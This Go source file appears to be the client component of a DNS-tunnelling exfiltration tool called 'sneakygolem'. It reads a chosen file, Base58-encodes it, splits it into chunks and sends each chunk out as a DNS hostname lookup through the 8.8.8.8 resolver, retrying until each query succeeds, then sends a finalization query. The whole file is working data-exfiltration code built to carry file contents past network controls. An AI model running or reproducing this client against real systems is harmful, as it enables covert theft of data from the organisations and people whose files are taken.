package client

import (
	"context"
	"net"
	"sneakygolem/internal/logger"
	"sneakygolem/internal/protocol"
	"time"
)

func queryDNS(host string) ([]string, error) {
	r := &net.Resolver{
		PreferGo: true,
		Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
			d := net.Dialer{
				Timeout: time.Millisecond * time.Duration(10000),
			}
			return d.DialContext(ctx, network, "8.8.8.8:53")
		},
	}
	ips, err := r.LookupHost(context.Background(), host)
	if err != nil {
		return nil, err
	}
	return ips, nil
}

func Run(filename string) error {
	logger.Init()
	logger.Client.Info("Client started")

	id, err := protocol.CreateId()
	if err != nil {
		logger.Client.Error("Failed to create ID:", "log", err)
		return err
	}
	logger.Client.Info("Generated ID:", "log", id)

	counter := 0
	file_content, err := protocol.ReadFileBase58(filename)
	if err != nil {
		logger.Client.Error("Failed to read from file:", "log", err)
		return err
	}
	payload_len := protocol.GlobalSettings.PayloadLength()
	for offset := 0; offset < len(file_content); offset += payload_len {
		end := offset + payload_len
		if end > len(file_content) {
			end = len(file_content)
		}
		chunk := file_content[offset:end]
		enc_payload, err := protocol.EncodePayload(id, counter, chunk)
		if err != nil {
			logger.Client.Error("Failed to encode payload:", "log", err)
			return err
		}
		logger.Client.Info("Encoded payload:", "log", enc_payload)
		_, err = queryDNS(enc_payload)
		for err != nil {
			logger.Client.Info("DNS query failed, trying again:", "log", err)
			_, err = queryDNS(enc_payload)
		}

		counter++
		if counter == protocol.GlobalSettings.MaxCount-1 {
			logger.Client.Error("Counter exceeded maximum value")
			break
		}
	}
	logger.Client.Info("All payloads sent, sending finalization packet")
	_, err = queryDNS(protocol.FinalizePayload(id))
	for err != nil {
		logger.Client.Info("Final DNS payload failed, trying again:", "log", err)
		_, err = queryDNS(protocol.FinalizePayload(id))
	}

	return nil
}
